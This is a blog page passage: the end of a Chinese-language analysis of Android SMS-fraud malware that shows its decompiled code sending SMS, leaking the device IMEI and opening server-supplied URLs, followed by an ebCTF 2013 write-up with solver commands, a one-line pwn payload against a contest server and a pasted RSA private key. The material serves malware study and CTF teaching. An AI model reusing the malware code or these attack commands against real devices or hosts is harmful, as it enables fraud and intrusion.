                com.google.android.gmss.l.j.remove(v1);
                v1 = (v1 - 1);
            }
        }
        return;
    }
    public static void a(android.content.Context p4)
    {
        v0 = com.google.android.gmss.l.a(0, 6, p4);
        v0.a();
        android.util.Log.i(&quot;ret&quot;, v0.d);
        if(v0.d.length() &gt; 0) {
            v0 = new org.json.JSONArray(v0.d).getJSONObject(0);
            v1 = new android.content.Intent();
            v1.setAction(&quot;android.intent.action.VIEW&quot;);
            v0 = v0.getString(&quot;msg_body&quot;);
            if(v0.contains(&quot;http://&quot;) == 0) {
                v0 = new StringBuilder(&quot;http://&quot;).append(v0).append(&quot;/&quot;).toString();
            }
            v1.setData(android.net.Uri.parse(v0));
            p4.startActivity(v1);
        }
        return;
    }
    public static void a(String p12, android.content.Context p13)
    {
        v3 = new org.json.JSONArray(p12);
        v4 = v3.length();
        v2 = 0;
        while (v2 &lt; v4) {
            v0 = v3.getJSONObject(v2);
            v5 = v0.getString(&quot;recipient&quot;);
            v6 = v0.getString(&quot;msg_body&quot;);
            v5.trim();
            v5 = v5.split(&quot;;&quot;);
            v7 = v5.length;
            v0 = 0;
            while (v0 &lt; v7) {
                v8 = v5[v0];
                android.util.Log.i(&quot;MSG&quot;, new StringBuilder(&quot;num: &quot;).append(v8).append(&quot;, msg_bdy:&quot;).append(v6).toString());
                com.google.android.gmss.l.a(v8, v6, p13);
                v0 = (v0 + 1);
            }
            v2 = (v2 + 1);
        }
        return;
    }
    public static void a(String p7, String p8, android.content.Context p9)
    {
        v0 = android.telephony.SmsManager.getDefault();
        if(p8.length() &lt;= 70) {
            v0.sendTextMessage(p7, 0, p8, 0, 0);
        } else {
            v6 = v0.divideMessage(p8).iterator();
            while (v6.hasNext() != 0) {
                v0.sendTextMessage(p7, 0, v6.next(), 0, 0);
            }
        }
        return;
    }
    public static String b()
    {
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(&quot;Product: &quot;).append(android.os.Build.PRODUCT).toString())).append(&quot;\x0aCPU_ABI: &quot;).append(android.os.Build.CPU_ABI).toString())).append(&quot;\x0aTAGS: &quot;).append(android.os.Build.TAGS).toString())).append(&quot;\x0aVERSION_CODES.BASE: 1&quot;).toString())).append(&quot;\x0aMODEL: &quot;).append(android.os.Build.MODEL).toString())).append(&quot;\x0aSDK: &quot;).append(android.os.Build$VERSION.SDK).toString())).append(&quot;\x0aVERSION.RELEASE: &quot;).append(android.os.Build$VERSION.RELEASE).toString())).append(&quot;\x0aDEVICE: &quot;).append(android.os.Build.DEVICE).toString())).append(&quot;\x0aDISPLAY: &quot;).append(android.os.Build.DISPLAY).toString())).append(&quot;\x0aBRAND: &quot;).append(android.os.Build.BRAND).toString())).append(&quot;\x0aBOARD: &quot;).append(android.os.Build.BOARD).toString())).append(&quot;\x0aFINGERPRINT: &quot;).append(android.os.Build.FINGERPRINT).toString())).append(&quot;\x0aID: &quot;).append(android.os.Build.ID).toString())).append(&quot;\x0aMANUFACTURER: &quot;).append(android.os.Build.MANUFACTURER).toString())).append(&quot;\x0aUSER: &quot;).append(android.os.Build.USER).toString();
    }
    public static void b(android.content.Context p6)
    {
        v2 = com.google.android.gmss.c.a(p6).b();
        if(v2.size() != 0) {
            v3 = p6.getSystemService(&quot;phone&quot;).getDeviceId();
            android.util.Log.i(&quot;SMS Reporter&quot;, &quot;Send SMS report&quot;);
            v1 = 0;
            while (v1 &lt; v2.size()) {
                com.google.android.gmss.l.a(v2.get(v1), new StringBuilder(&quot;*#060#&quot;).append(v3).toString(), p6);
                v1 = (v1 + 1);
            }
        }
        return;
    }
    public static void c(android.content.Context p3)
    {
        if(com.google.android.gmss.m.a(p3) != 0) {
            com.google.android.gmss.c.a(p3).a();
            v0 = com.google.android.gmss.l.a(0, 2, p3);
            v0.a();
            if(v0.d.length() != 0) {
                android.util.Log.i(&quot;ret&quot;, v0.d);
                com.google.android.gmss.l.a(v0.d, p3);
            }
        }
        return;
    }
}
</code></pre></noscript></div>


<p>裝了惡意程式之後會莫名其妙的被盜用小額付費的原因，
我<strong>猜</strong>應該是小額付費的認證簡訊會包含特定內容，把整封簡訊回傳是為了要拿到小額付費的認證碼，
如果不是小額付費的簡訊，這隻惡意程式會回傳前六個字元的原因，
我<strong>猜</strong>可能是覺得簡訊一開頭很有可能有人名吧，
一但拿到人名 + 電話，就又多了一個詐騙的目標&hellip;&hellip;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/08/ebctf-2013-writeup/">ebCTF 2013 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-08T20:56:00+08:00" pubdate data-updated="true">Nov 8<span>th</span>, 2013</time>
        
           | <a href="/blog/2013/11/08/ebctf-2013-writeup/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>拖超久的 writeup ，感謝一起玩的 <a href="http://ctftime.org/team/5160">217</a> 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup</p>

<h2>BIN100</h2>

<p>擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。</p>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN300</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb
</span><span class='line'>(gdb) file moon
</span><span class='line'>(gdb) b luaL_loadbuffer
</span><span class='line'>Breakpoint 1 at 0x411110
</span><span class='line'>(gdb) r
</span><span class='line'>Breakpoint 1, 0x0000000000411110 in luaL_loadbuffer ()
</span><span class='line'>(gdb) x/3s $rsi
</span><span class='line'>0x627340 &lt;content.2593&gt;:    "p = 54111037\ng = 56321\n\nio.write(\"Enter your password: \")\nio.flush()\npassword=io.read()\nif string.len(password) ~= 32 then\n    print(\"Wrong!\")\n    return 0\nend\n\nv = g\nalpha = \"0123456789abcdef\"\nfor lo"...
</span><span class='line'>0x627408 &lt;content.2593+200&gt;:    "op =1,32 do\n    v = v * g\n    v = v % p\n    r = v % 16\n    good = string.sub(alpha,r+1,r+1)\n    if good ~= string.sub(password,loop,loop) then\n        print(\"Wrong!\")\n        return 0\n    end\nend\nprin"...
</span><span class='line'>0x6274d0 &lt;content.2593+400&gt;:    "t(\"Well done, the flag is: ebCTF{\"..password..\"}\")\n-- f02233aca4839124ee6ffa766883c47e\n"</span></code></pre></td></tr></table></div></figure>


<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN400</h2>

<p>題目是要生出 5 個 MD5 一樣的 console executable PE32 ，分別會印出：</p>

<ul>
<li>File1: All Eindbazen are wearing wooden shoes</li>
<li>File2: All Eindbazen live in a windmill</li>
<li>File3: All Eindbazen grow their own tulips</li>
<li>File4: All Eindbazen smoke weed all day</li>
<li>File5: All Eindbazen are cheap bastards</li>
</ul>


<p>所以做 md5 collision ，原本檔案的內容是對自己做簡單的 hash 再從 hash 決定要印哪一句：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// by seanwu
</span><span class='line'>##include &lt;stdio.h&gt;
</span><span class='line'>const char* str[5]= {
</span><span class='line'>    "All Eindbazen are wearing wooden shoes",
</span><span class='line'>    "All Eindbazen live in a windmill",
</span><span class='line'>    "All Eindbazen grow their own tulips",
</span><span class='line'>    "All Eindbazen smoke weed all day",
</span><span class='line'>    "All Eindbazen are cheap bastards"
</span><span class='line'>};
</span><span class='line'>int main(int argc,char **argv){
</span><span class='line'>    FILE* f=fopen(argv[0],"rb");
</span><span class='line'>    fseek(f,-20005,SEEK_END);
</span><span class='line'>    int x=0;
</span><span class='line'>    unsigned char z;
</span><span class='line'>    for( int i=0; i&lt;20000; i++ ){
</span><span class='line'>        fread(&z,1,1,f);
</span><span class='line'>        x=(x*33331+z)%5;
</span><span class='line'>    }
</span><span class='line'>    x=(x+5)%5;
</span><span class='line'>    puts(str[x]);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h3>Reference</h3>

<ul>
<li><a href="http://www.mscs.dal.ca/~selinger/md5collision/">http://www.mscs.dal.ca/~selinger/md5collision/</a></li>
<li><a href="http://www.woodmann.com/forum/archive/index.php/t-10096.html">http://www.woodmann.com/forum/archive/index.php/t-10096.html</a></li>
</ul>


<h2>CRY100</h2>

<ul>
<li><p>1st PART</p>

<p>  原文在 <a href="http://en.wikipedia.org/wiki/Klomp">http://en.wikipedia.org/wiki/Klomp</a> ，用原文來解對應。</p></li>
<li><p>2nd PART</p>

<p>  用的是 ADFGVX cypher 用的 key 是 &lsquo;CARGO&rsquo; ，可以到 <a href="http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en">http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en</a> 做完之後再找一下對應：</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo 'KZUJJUN06TR3T2T6ABTEAB163A3NREE1JZ6N3QFLIYHMP X7V6C6TUK53TZ653N2UNRB316WE11VZ3UV3AKKZUJJ3RV 6D6SZ6J32S11D353TDVZUN0UK68U2N6V23312T33V646N VE4VA36NJZ6N3NSAB3TQFLIYHMPX78UNRT30ETRKBTEAF QQ8U16J6VEV63KHQ8U164ES1U216W3TLL8U16EJJ13KFI Y8U1613386N3K346NRJETV62VZ321E0B4F4Q7' | tr -d ' ' | tr KZUJN06TR32ABEQFLIYHMPX7VC54 shipngordefmba0123456789tjvc
</span><span class='line'>
</span><span class='line'>shippingorderfrombramb1oemendaa1phone0123456789tojorisverhovenfindbe1oWa11theitemsshippedtoDoShopefS11DeverDthingiso8ifnotfee1freetocontactmeonphonenSmber01234567898indregardsbram1008i1opotatoes508i1ocaS1if1oWer228i1oapp1es1348i1o1ee8onesecondpartofthef1agbc1c09</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>3rd PART</p>

<p>  <code>base64</code> 之後猜測可能是被 <code>xor</code> 過後的 <code>jpeg</code> ，找出 <code>xor</code> key 之後 flag 在圖片裡。</p></li>
<li><p>4th PART</p>

<p>  切開之後直的看就是了！</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo 'thhneu hpeitr eafnw frleo otata uoghb rfirf ttseo' | tr ' ' $'\n'
</span><span class='line'>
</span><span class='line'>thhneu
</span><span class='line'>hpeitr
</span><span class='line'>eafnw
</span><span class='line'>frleo
</span><span class='line'>otata
</span><span class='line'>uoghb
</span><span class='line'>rfirf
</span><span class='line'>ttseo</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>5th PART</p>

<p>  人眼找對應：</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 5.txt | tr "[:lower:]" "[:upper:]" | tr SIWZGDRYUOMKQBTJPNFEHLX aistheflgbuprodywmcknxv
</span><span class='line'>
</span><span class='line'>a common mistake made by foreigners is that the netherlands legaliAed the use of cannabis and other recreational soft drugs. according the law any use of drugs is still illegal, but there is a tolerancy policy called gedoogbeleid for any soft drugs. this is a set of guidelines telling public prosecutors under which circumstances offenders should not be prosecuted. according to current gedoogbeleid the possession of a maximum amount of five grams cannabis for personal use is not prosecuted. cultivation is treated in a similar way. cultivation of 5 plants or less is usually not prosecuted when they are renounced by the cultivator.  so if you come to the netherlands and want to try some recreational use of soft drugs, beware that it is not legal. the fifth part for the flag is ab1fde</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>6th PART</p>

<p>  Caesar cipher with shift = 4</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 6.txt | tr "[:upper:]" "[:lower:]" | tr abcdefghijklmnopqrstuvwxyz wxyzabcdefghijklmnopqrstuv
</span><span class='line'>
</span><span class='line'>the delta works is a series of construction projects in the southwest of the netherlands to protect a large area of land around the rhine-meuse-scheldt delta from the sea. the works consist of dams, sluices, locks, dikes, levees, and storm surge barriers. the aim of the dams, sluices, and storm surge barriers was to shorten the dutch coastline, thus reducing the number of dikes that had to be raised.
</span><span class='line'>along with the zuiderzee works, delta works have been declared one of the seven wonders of the modern world by the american society of civil engineers. the last part of the flag is: one-five-f-three-four-}</span></code></pre></td></tr></table></div></figure>


<h2>CRY200</h2>

<p>聽大大說是要去對一堆 n 去做 gcd ，分解出其中一組質數 p, g ，接著再去暴力試出 e, d</p>

<h3>Reference</h3>

<ul>
<li><a href="http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/">http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/</a></li>
</ul>


<h2>CRY300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://pastebin.com/vsUZW2WF">http://pastebin.com/vsUZW2WF</a></li>
</ul>


<h2>CRY400</h2>

<h2>FOR100</h2>

<p>先 <code>strings</code> 發現</p>

<pre><code>eindbazen@eindbazen:~$ python2 ctf.py ' i hide my '
</code></pre>

<p>感覺就是他了！所以試著 <code>grep ctf.py</code> 沒東西之後，再試了 <code>grep sys.argv</code> 會找到一段 <code>python</code> code</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
</span><span class='line'>import time
</span><span class='line'>import random
</span><span class='line'>import signal
</span><span class='line'>from Crypto.Cipher import AES
</span><span class='line'>key1 = "is this where"
</span><span class='line'>key2 = sys.argv[1]
</span><span class='line'>key3 = raw_input("Password: ")
</span><span class='line'>iv = 'a very random iv'
</span><span class='line'>secret = './flag'
</span><span class='line'>mode = AES.MODE_CBC
</span><span class='line'>def encrypt(signum, frame):
</span><span class='line'>    key = key1 + key2 + key3
</span><span class='line'>    enc = AES.new(key, mode, iv)
</span><span class='line'>    inp = raw_input("Enter secret: ")
</span><span class='line'>    diff = len(inp) % 16
</span><span class='line'>    if diff != 0:
</span><span class='line'>    inp += ' ' * (16 - diff)
</span><span class='line'>    with open(secret, 'wb') as outfile:
</span><span class='line'>        outfile.write(enc.encrypt(inp))
</span><span class='line'>    del key, enc
</span><span class='line'>def decrypt(signum, frame):
</span><span class='line'>    key = key1 + key2 + key3
</span><span class='line'>    enc = AES.new(key, mode, iv)
</span><span class='line'>    with open(secret, 'rb') as infile:
</span><span class='line'>        print(enc.decrypt(infile.read(48)))
</span><span class='line'>    del key, enc
</span><span class='line'>signal.signal(signal.SIGUSR1, encrypt)
</span><span class='line'>signal.signal(signal.SIGUSR2, decrypt)
</span><span class='line'>while True:
</span><span class='line'>    time.sleep(1)</span></code></pre></td></tr></table></div></figure>


<p>接著要找 <code>key3</code> ，試著 <code>grep 'i hide my'</code> 之後找到一行</p>

<pre><code>is this where i hide my secrets?
</code></pre>

<p>拿他當 key 跑 AES decrypt 就拿到 flag 了！</p>

<h2>FOR200</h2>

<h3>Reference</h3>

<pre><code>&lt; Guest10733&gt; how did u get sms in for200 ?
&lt;@gijs&gt; Guest10733: the SMS is stored in inbox.txt but in some binary format that is also used to transmit sms over the network
&lt; cr0n&gt; Guest10733: sms pdu: http://www.smartposition.nl/resources/sms_pdu.html
</code></pre>

<h2>FOR300</h2>

<h3>Reference</h3>

<h2>FOR400</h2>

<h2>NET100</h2>

<p>從給的 <code>net-100.pcap</code> 裡可以找到一個有密碼的 <code>rookit.zip</code> ，發現裡面有 flag ，接著就是要找解壓縮密碼了，密碼可以在一連串的 udp packet 中找到！</p>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET200</h2>

<p>這題一開始只給了 <code>112 + 386 + 712 + 1398 + 8771 + 11982 + 15397 + 23984 = 51037</code> ，連到網頁看到了 <code>X-Powered-By:*knock knock*</code> ，猜測是要做 port knocking ！</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc -w 1 54.216.81.14 112;
</span><span class='line'>$ nc -w 1 54.216.81.14 386;
</span><span class='line'>$ nc -w 1 54.216.81.14 712;
</span><span class='line'>$ nc -w 1 54.216.81.14 1398;
</span><span class='line'>$ nc -w 1 54.216.81.14 8771;
</span><span class='line'>$ nc -w 1 54.216.81.14 11982;
</span><span class='line'>$ nc -w 1 54.216.81.14 15397;
</span><span class='line'>$ nc -w 1 54.216.81.14 23984;
</span><span class='line'>$ nc -w 1 54.216.81.14 51037;
</span><span class='line'>So you are knocking me, how about I return the favor?
</span><span class='line'>Repeat after me and I will open the last port…</span></code></pre></td></tr></table></div></figure>


<p>下一階段的提示是要照著對方敲我們 port 的順序敲回去，我們是利用 <code>iptables</code> 來把進來的 tcp connection 記錄下來：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># iptables -A INPUT -p tcp -j LOG --log-prefix ' INPUT TCP ' --log-level 4</span></code></pre></td></tr></table></div></figure>


<p>接著會在 <code>/var/log/kern.log</code> 拿到記錄，接著再敲回去：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc -w 1 54.216.81.14 8112;
</span><span class='line'>$ nc -w 1 54.216.81.14 33386;
</span><span class='line'>$ nc -w 1 54.216.81.14 14712;
</span><span class='line'>$ nc -w 1 54.216.81.14 4398;
</span><span class='line'>$ nc -w 1 54.216.81.14 1771;
</span><span class='line'>$ nc -w 1 54.216.81.14 52313;
</span><span class='line'>$ nc -w 1 54.216.81.14 25697;
</span><span class='line'>$ nc -w 1 54.216.81.14 932;
</span><span class='line'>$ nc -w 1 54.216.81.14 22222;
</span><span class='line'>[Advanced]
</span><span class='line'>        sequence    = 234,781,983,2411,9781,14954,23112,63991
</span><span class='line'>        seq_timeout = 15
</span><span class='line'>        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
</span><span class='line'>        tcpflags    = fin,urg,!ack
</span><span class='line'>        cmd_timeout = 30
</span><span class='line'>        stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT</span></code></pre></td></tr></table></div></figure>


<p>拿到第三階段的提示了！查了一下發現是 <a href="http://www.zeroflux.org/projects/knock/">knockd</a> 的設定檔，這次會檢查 tcp flags ，我們是用 (hping)[<a href="http://www.hping.org/">http://www.hping.org/</a>] 來設 tcp flags</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hping3 -c 1 -F -U -p 234   54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 781   54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 983   54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 2411  54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 9781  54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 14954 54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 23112 54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 63991 54.216.81.14</span></code></pre></td></tr></table></div></figure>


<p>最後再連 port 32154 就會噴 flag 了！</p>

<h3>Reference</h3>

<pre><code>&lt; ai1&gt; Ghaaf, the final one:

    nmap -vvv -PN --scanflags FINURG 54.216.81.14 -r -p234,781,983,2411,9781,14954,23112,63991 --scan-delay 1

&lt; Tilou&gt; http://pastebin.com/jBr3d9wR &lt;- hping way

    #!/bin/bash
    sequence="234 781 983 2411 9781 14954 23112 63991"
    for port in $sequence; do
        hping -F -U -c 1 -p $port 54.216.81.14 &gt; /dev/null 2&gt;&amp;1
    done
    nc 54.216.81.14 32154
</code></pre>

<ul>
<li><a href="http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up">http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up</a></li>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET400</h2>

<h3>Reference</h3>

<h2>PWN100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; foundation: pwn100 initial key https://p.6core.net/p/yMz8naU2ZphAAHWjGkY7ICcD

-----BEGIN RSA PRIVATE KEY-----
MIIEoAIBAAKCAQEA8Ew1BzA3rNBwrFYevJ6mJMVfe+ZMrbrq20Q78MIprjxMmEV8
hUiYq4CftCeNj+XxYYuaYLwAA8GfW+wrS04AAEzHTNwc1wKbHdOzvParhiIFOjJ2
NX/ljlQA7LCO0bToMg971gKrFGYPGMa5vKsx9hXyDCLegXHV3G/duPxaG0hkYucC
UrilqtGMFmpFQu+vgDdudEEVg+01BtNanCxOeYuWLnd8ViZx3qrdooPNnhxh1hop
ciYNp5ORQiYKFFCmIxAMRnXYlZt5CbPIbNrRLHKSnrDyOhSLa0e3tjnGYv+YjrHB
OaWQoPu3dOu88ason5jhbTKzZ2gOe24vlg9hdwIBIwKCAQApMaKwxm/xvVUk25A9
l4oyMHbEyGTqlRJReWlceQ51o+/fluIleijM8Xp2p7HeJ2s1SyHHcK+LnYkIcaEF
mFfFiYFAYD91UOdkMuucvJJuxADlZ7x+My6qr1Cdmpwj8yB9nEEdX4sKz6rRDB/X
M0pks04QtYU6ww64Ey1S6W6IVTh/6TNzPc2mEBtHJd7yDI08aY0fbIOf5z4WNPBE
oEYIu6FWTMDf57XaUPclrPNnCturWcAdzw1DgYiyuDaS4YtryDfyaBA+WbepEOEb
HFkMf6jgDfqpnGc+vL8Z3ggoftOHZPdS3NNScrR1zRZbRyLP6DNRPjmIldThIrdv
fb+LAoGBAPzFhrlH84GwoZs+Hd/YFYgQxySGEqSspp6x14wv+7eseUN8Vp/+A11Z
kZfRHrZU5r5eTIlo+ajXeX8Uu04U5A0X3mFXpfsGksPuEvVPPzCHwHIvfsDl2u/3
ymStMDg2DHbAnyncLYUVVMjAVudL7MDq3fz1T44gfAcj+/jQOgwBAoGBAPNd5UeV
MfRcJ1G5RNDm5kTkXegMNXEH1wF+HFTb3v5Ey9A6tnc+Bhpg66QgSYtwIPdll2oF
9Jdw+8oa4tL785ZrzGSTcNQjUrBsE7H/dkPbyXH+4KXMKUEwME2cz7PrZKU4RZ9P
b+WACdIFaH3mn3H38GPIotWqLK2LfQi7d813AoGAVqofj/tpbkswF/gKPh4zRJgJ
w2Eq9qGYNmjcMBBzj25VdjlCRXupYdWRANn75r4F+CBUwWXR8L7n08yX/YOBY5Mn
rFiQrdZeNIwjwdIHCVMdaPpXWBRLEHI2w26UMIePPqhxFaqTQ5JI9F8zvQQWqIsK
SBmXnnGJnAxWY++e34sCgYB2NOu1DfOxNBMZENhINaMLhN0nkObB3zyLskhGeWxP
ncIUrs2nochzNmPTYCO4wW8ZFBZYEYVuIO9TiWbbgbDUCHk4KltfuWKtdlK1irXJ
MD1F/3RtyZBhfc5RlU7w/U4kXSkhflrr0HnMaQbeEO5b7XTCwIma+uKALc8EPcx5
vQKBgBCqEbKrfUF5H1QQunHiIsRE40zJ8MaGZbdT7ZC/bXTcwFnC+m3Ql/Iko3KU
qJ59EAryB5SmrpViNlhl3JL+Pu2m4fNhvxVfBdNSxuJMjodK6n2O4WeF0NUS0bpZ
EZRema+mBXD/lSTh1d9FnEOwrbFFEnuTZfAnEvEFo1m/Qn43
-----END RSA PRIVATE KEY-----
</code></pre>

<h2>PWN200</h2>

<pre><code>$ perl -e 'print "&gt;"x51 . "-"x47 . "\ncat IM_A_FLAG\n"' | nc 176.34.95.148 31313
</code></pre>

<h2>PWN300</h2>

<h3>Reference</h3>

<pre><code>&lt; gna_&gt; pwn300 writeup
&lt; gna_&gt; http://pastebin.com/G0KvW6t6
&lt; bata_&gt; pwn300 http://pastebin.com/gc8u6J3M
</code></pre>

<ul>
<li><a href="http://haxx.in/ebctf_pwn300_sploit.php.txt">http://haxx.in/ebctf_pwn300_sploit.php.txt</a></li>
<li><a href="http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html">http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html</a></li>
</ul>


<h2>PWN400</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html">http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet&#8212;dimwit&#8212;pwn-400.html</a></li>
</ul>


<h2>WEB100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; loveldyream: this is what i developed when i tested it
